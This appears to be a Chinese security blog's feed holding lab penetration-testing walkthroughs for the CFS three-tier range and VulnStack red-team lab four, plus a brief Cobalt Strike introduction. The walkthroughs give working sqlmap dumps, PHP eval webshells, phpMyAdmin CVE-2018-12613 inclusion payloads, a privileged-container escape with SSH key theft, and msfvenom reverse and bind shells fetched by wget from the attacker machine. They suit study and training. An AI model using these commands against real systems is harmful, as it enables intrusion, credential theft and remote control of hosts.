data-language="bash"><code class="language-bash">proxychains4 sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://192.168.22.129/index.php?r=vul&amp;keyword=1"</span> <span class="token parameter variable">-D</span> bagecms <span class="token parameter variable">-T</span> bage_admin <span class="token parameter variable">-C</span> username,password <span class="token parameter variable">--dump</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828222233281.png" alt="image-20230828222233281"></p><p>admin</p><p>123qwe</p><p>登陆后台</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828222342980.png" alt="image-20230828222342980"></p><p>查看有什么可以利用的地方</p><p>在模板的地方可以写入内容那就直接写入一句话木马</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828222534223.png" alt="image-20230828222534223"></p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828222614043.png" alt="image-20230828222614043"></p><p>虽然写入了但是不知道一句话木马的路径</p><p>然后我们可以输出一点东西看在那个页面显示，因为是写入在tag里面找带‘标签’的页面</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828223008314.png" alt="image-20230828223008314"></p><p>发现在首页–标签页面发现aaaa的输出</p><p>则一句话木马就在&#x2F;index.php?r&#x3D;tag路径下</p><p>蚁剑连接</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828223209239.png" alt="image-20230828223209239"></p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828223234161.png" alt="image-20230828223234161"></p><p>成功getshell</p><h3 id="获取主机权限-1"><a href="#获取主机权限-1" class="headerlink" title="获取主机权限"></a>获取主机权限</h3><p>同样先生成一个木马文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">3333</span> <span class="token parameter variable">-f</span> elf <span class="token operator">></span> hack.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>把生成的hack.elf上传到蚁剑</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828224208206.png" alt="image-20230828224208206"></p><p>在MSF中开启EXP，与Target2建立连接，这里需要注意，上一次代理使用的reverse_tcp是MSF作为监听，让Target1连到我们，而这次代理使用的bind_tcp是Target2作为监听，我们需要连到Target2，这个逻辑正好是相反的。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 msfconsole<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/bind_tcp<span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.22.129<span class="token builtin class-name">set</span> lport <span class="token number">3333</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>给hack.elf赋予权限并执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> hack.elf./hack.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828224732996.png" alt="image-20230828224732996"></p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828224752737.png" alt="image-20230828224752737"></p><p>拿到meterpreter，成功拿下Target2</p><p>继续进行内网渗透</p><h2 id="攻击Target3"><a href="#攻击Target3" class="headerlink" title="攻击Target3"></a>攻击Target3</h2><h3 id="路由信息探测-1"><a href="#路由信息探测-1" class="headerlink" title="路由信息探测"></a>路由信息探测</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run get_local_subnets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828225058783.png" alt="image-20230828225058783"></p><p>发现还有一个33网段</p><p>然后添加33网段的路由</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#通过meterpreter添加22网段的路由信息，这样kali与centos就可以互通了</span>run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.33.0/24run autoroute <span class="token parameter variable">-p</span><span class="token comment">#这一步也可以使用run post/multi/manage/autoroute自动添加路由</span>run post/multi/manage/autoroute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828233041111.png" alt="image-20230828233041111"></p><p>与之前一样，我们添加Target3的路由，由于还在那个终端里，auxiliary&#x2F;server&#x2F;socks_proxy正在执行，所以添加了新路由，也就可以访问新路由内网，这里就不用设置代理了，直接添加路由即可</p><h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sT</span> <span class="token number">192.168</span>.33.33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230829000749095.png" alt="image-20230829000749095"></p><p>发现开放445端口，直接用永恒之蓝攻击</p><h3 id="获取主机权限-2"><a href="#获取主机权限-2" class="headerlink" title="获取主机权限"></a>获取主机权限</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search ms17_010use <span class="token number">0</span>options<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.33.33<span class="token builtin class-name">set</span> lport <span class="token number">4444</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功拿到meterpreter</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828234921619.png" alt="image-20230828234921619"></p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230828234954890.png" alt="image-20230828234954890"></p><p>拿到了system权限,可以进入shell</p><p><img src="/2023/08/29/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/image-20230829000224523.png" alt="image-20230829000224523"></p><p>chcp 65001解除乱码</p><p>然后可以进行判断开启3389端口，可以使用远程登录</p><p>这是我第二次打这个靶场，第一次打得写的wp丢了只能重新打一遍，但是我第一次的时候算是第一次开始接触内网渗透，这篇文章也算是渗透打靶处女作</p><p>第一次打的时候是参考teamssix佬的博客打的，这一次是纯自己打的，我把teammsix佬的博客文章放下面，teamssix佬写的比较详细</p><p><a href="https://teamssix.com/191021-211425.html#toc-heading-10">https://teamssix.com/191021-211425.html#toc-heading-10</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CFS三层靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cobaltstrike</title>
      <link href="/2023/08/28/cobaltstrike/"/>
      <url>/2023/08/28/cobaltstrike/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Cobalt Strike是一款基于java的渗透测试神器，常被业界人称为CS神器。自3.0以后已经不在使用Metasploit框架而作为一个独立的平台使用，分为客户端与服务端，服务端是一个，客户端可以有多个，非常适合团队协同作战，多个攻击者可以同时连接到一个团队服务器上，共享攻击资源与目标信息和sessions，可模拟APT做模拟对抗，进行内网渗透。<br>Cobalt Strike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。</p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p><img src="/2023/08/28/cobaltstrike/image-20230828195118700.png" alt="image-20230828195118700"></p><pre class="line-numbers language-none"><code class="language-none">agscript 拓展应用的脚本c2lint 用于检查profile的错误异常teamserver 服务端程序cobaltstrike，cobaltstrike.jar客户端程序(java跨平台) license.pdf 许可证文件logs 目录记录与目标主机的相关信息 update，update.jar用于更新CS third-party 第三方工具<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装运行"><a href="#安装运行" class="headerlink" title="安装运行"></a>安装运行</h2><p>直接下载解压就行但是需要有java环境</p><p>启动服务端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> teamserver  <span class="token comment">#赋予执行权限</span>./teamserver <span class="token function">ip</span> <span class="token function">passwd</span> <span class="token comment"># 设置强密码，否则容易被爆破</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/28/cobaltstrike/image-20230828195619280.png" alt="image-20230828195619280"></p><p>启动客户端</p><pre class="line-numbers language-none"><code class="language-none">chmod 777 cobaltstrike.&#x2F;cobaltstrike   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/28/cobaltstrike/image-20230828195749393.png" alt="image-20230828195749393"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>因为我之前写的笔记不小心删除了，所以我下面放出几篇参考文章，后续我有时间再补上</p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129">https://blog.csdn.net/weixin_44677409/article/details/102725129</a></p>]]></content>
      
      
      <categories>
          
          <category> cs和msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnStack&amp;ATT红队实战四</title>
      <link href="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/"/>
      <url>/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class="line-numbers language-none"><code class="language-none">strusts漏洞利用phpmyadmin getshelltomcat 漏洞利用docker逃逸ms14-068ssh密钥利用流量转发历史命令信息泄露域渗透<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p><p>网卡配置我配的是这两个</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230812202619560.png" alt="image-20230812202619560"></p><p>给web配</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230812195456996.png" alt="image-20230812195456996"></p><p>给win7和DC配置的都是VMnet5</p><p>初始密码</p><pre class="line-numbers language-none"><code class="language-none">web: ubuntu:ubuntuwin7: douser:Dotest123DC: administrator:Test2008<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是DC的密码过期了需要自己改下</p><pre class="line-numbers language-none"><code class="language-none">攻击机：kali 192.168.10.128web: ubuntu 192.168.10.130            192.168.183.131win7: 192.168.183.129DC :  192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Web服务器为ubuntu，漏洞需要我们手动开启</p><pre class="line-numbers language-none"><code class="language-none">s2-045cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;struts2&#x2F;s2-045sudo docker-compose up -dCVE-2017-12615(tomcat put上传)cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;tomcat&#x2F;CVE-2017-12615&#x2F;sudo docker-compose up -dcve-2018-12613(phpmyadmin文件包含漏洞)cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;phpmyadmin&#x2F;CVE-2018-12613&#x2F;sudo docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>端口扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T4</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.10.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813124139317.png" alt="image-20230813124139317"></p><p>开放了</p><pre class="line-numbers language-none"><code class="language-none">22 ssh2001 struts22002 tomcat2003 phpmyadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h4><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813142218373.png" alt="image-20230813142218373"></p><p>访问之后是一个文件上传</p><p>使用脚本扫描一下：<a href="https://github.com/Abs1n7he/Struts2scan">https://github.com/Abs1n7he/Struts2scan</a></p><p>发现存在漏洞</p><p>然后直接利用工具上传webshell</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813151350992.png" alt="image-20230813151350992"></p><p>上传webshell</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813153005855.png" alt="image-20230813153005855"></p><p>蚁剑连接getshell</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813153056845.png" alt="image-20230813153056845"></p><h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>搜8.5.19会有这个版本的漏洞</p><p>本来想找工具直接用的，但是没有找到好用的工具</p><p>手上shell</p><p>先抓包，然后改为PUT方式上传木马</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813155247442.png" alt="image-20230813155247442"></p><p>上传php的码但是不能用</p><p>然后上传jsp的码，但是上传不能成功，需要进行绕过 &#x2F;绕过  文件流绕过 ……</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813160745766.png" alt="image-20230813160745766"></p><p>蚁剑连接getshell</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813160836153.png" alt="image-20230813160836153"></p><h4 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h4><p>可以我参考我前面文章的phpmyadmin getshell姿势</p><p><a href="https://f14g-orz.github.io/2023/07/27/phpmyadmin%E5%90%8E%E5%8F%B0mysqlgetshell%E5%A7%BF%E5%8A%BF/">https://f14g-orz.github.io/2023/07/27/phpmyadmin%E5%90%8E%E5%8F%B0mysqlgetshell%E5%A7%BF%E5%8A%BF/</a></p><p>发现文章里的方法都不可以，是因为用户的权限太低</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813162845539.png" alt="image-20230813162845539"></p><p>发现版本 4.8.1</p><p>搜索phpmyadmin 4.81,发现这个版本有一个 CVE-2018-12613</p><p>有以下三种利用方式：</p><ul><li>任意文件包含</li></ul><p>需要先在根目录下创建一个文件，内容随意写入</p><p>然后访问，就能访问到文件的内容</p><pre class="line-numbers language-none"><code class="language-none">?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;cc.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>任意代码执行</li></ul><p>先查看当前数据库的路径，创建数据表f14g,表值是      <?php @eval(POST[1]); ?></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">"%datadir%"</span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> f14g<span class="token punctuation">(</span>code <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> f14g<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token keyword">VALUES</span><span class="token punctuation">(</span><span class="token string">"&lt;?php @eval(POST['f14g']); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813164355580.png" alt="image-20230813164355580"></p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230813170003053.png" alt="image-20230813170003053"></p><pre class="line-numbers language-none"><code class="language-none">f14g&#x3D;phpinfo();&amp;?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;test&#x2F;f14g.frm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是我这里没有成功</p><ul><li>session文件包含</li></ul><p>先在数据库执行sql语句 SELECT ‘<?php phpinfo(); ?>‘;</p><p>这样这个查询语句就写入了session,也就是将 可执行代码 phpinfo();写入了session中</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814105459181.png" alt="image-20230814105459181"></p><p>session的文件名为sess_+sessionid. session路径的视环境而定</p><p><strong>php</strong>生成<code>session</code>时，会生成在<code>/tmp</code>目录下，且以<code>sess_</code>开头</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?target&#x3D;db_datadict.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_dfb5475880cfc82ea881acccaa0942a7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到成功执行</p><p>然后再写入php一句话木马</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @eval(GET['f14g']);?>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?target&#x3D;db_datadict.php%253f..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;sess_dfb5475880cfc82ea881acccaa0942a7&amp;f14g&#x3D;ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们虽然getshell了,但是通过使用命令发现好多命令都不可以使用，我们得到的shell是个不完整的shell</p><h3 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h3><p>判断根目录下是否含有.dockerenv文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> /.dockerenv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看系统进程的cgroup信息是否存在docker字符串</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/1/cgroup或<span class="token function">cat</span> /proc/self/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814163134504.png" alt="image-20230814163134504"></p><p>而且还有很多命令不能使用</p><p>利用特权模式逃逸</p><p>Docker 高危启动参数 – privileged 特权模式启动容器 当操作者执行docker run –privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</p><pre class="line-numbers language-none"><code class="language-none">查看磁盘文件 fdisk -l建一个目录：mkdir &#x2F;test挂载磁盘到新建目录：mount &#x2F;dev&#x2F;sda1 &#x2F;test切换根目录：chroot &#x2F;test到这里已经成功逃逸了，然后就是常规的反弹shell 和 写 ssh 了。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814165607114.png" alt="image-20230814165607114"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /test/home/ubuntu/.ssh<span class="token function">cat</span> id_rsa复制id_rsa的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814171436394.png" alt="image-20230814171436394"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> id_rsa<span class="token comment"># 将其复制进来保存退出</span>sssjohn <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt <span class="token builtin class-name">hash</span><span class="token comment"># 得到密码ubuntu</span><span class="token function">ssh</span> ubuntu@192.168.10.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到这里应该会得出web主机的密码，但是我这里没有出我就直接用了(ubuntu)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> ubuntu@192.168.10.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入密码连接成功</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814183927840.png" alt="image-20230814183927840"></p><p>切换成root</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814184106473.png" alt="image-20230814184106473"></p><p>docker逃逸可以参考</p><p><a href="https://www.cnblogs.com/hellobao/articles/17248614.html">https://www.cnblogs.com/hellobao/articles/17248614.html</a></p><p><a href="https://blog.csdn.net/woodwhale/article/details/129815797">https://blog.csdn.net/woodwhale/article/details/129815797</a></p><h3 id="获取web主机权限"><a href="#获取web主机权限" class="headerlink" title="获取web主机权限"></a>获取web主机权限</h3><p>getshell之后通过通过上线msf获取主机权限</p><p>生成木马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.10.128 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">1111</span> <span class="token parameter variable">-f</span> elf <span class="token operator">></span> shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>开启web服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> http.server <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>长传到Ubuntu上</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.10.128/shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814200358625.png" alt="image-20230814200358625"></p><p>设置监听</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler<span class="token builtin class-name">set</span> payload linux/x86/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.10.128<span class="token builtin class-name">set</span> lport <span class="token number">1111</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把生成的木马上传并赋予权限执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span>  <span class="token number">777</span> shell.elf./shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814160232463.png" alt="image-20230814160232463"></p><p>赋予权限并执行</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814200657923.png" alt="image-20230814200657923"></p><p>然后就拿到了meterpreter</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814201135319.png" alt="image-20230814201135319"></p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>查看路由</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run get_local_subnets<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230814201617650.png" alt="image-20230814201617650"></p><p>可以确定183网段即为内网网段</p><p>然后我们需要配置代理扫描内网存活主机以及开放端口</p><p>添加路由</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">192.168</span>.183.0/24run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后直接扫描内网存活的主机</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">k</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span> <span class="token function">seq</span> <span class="token number">1</span> <span class="token number">255</span><span class="token variable">)</span></span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">192.168</span>.183.<span class="token variable">$k</span><span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"ttl"</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token parameter variable">-F</span> <span class="token string">"[ :]+"</span> <span class="token string">'&#123;print $4&#125;'</span><span class="token punctuation">;</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230815114112047.png" alt="image-20230815114112047"></p><p>发现有三个存活主机 131那个是Ubuntu的</p><p>说明还有两个其他的主机</p><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>kali攻击机上开启web服务</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> http.server <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后把kali上的frp上传到Ubuntu上</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.10.128/frp_0.51.3_linux_amd64.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> frp_0.51.3_linux_amd64.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230815145227109.png" alt="image-20230815145227109"></p><p>在kali上配置frps.ini,并开启frps</p><p><img src="/2023/08/17/VulnStack-ATT%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E5%9B%9B/image-20230815145347505.png" alt="image-20230815145347505"></p><p>在Ubuntu上配置frpc.ini,并开启frpc</p><p><img 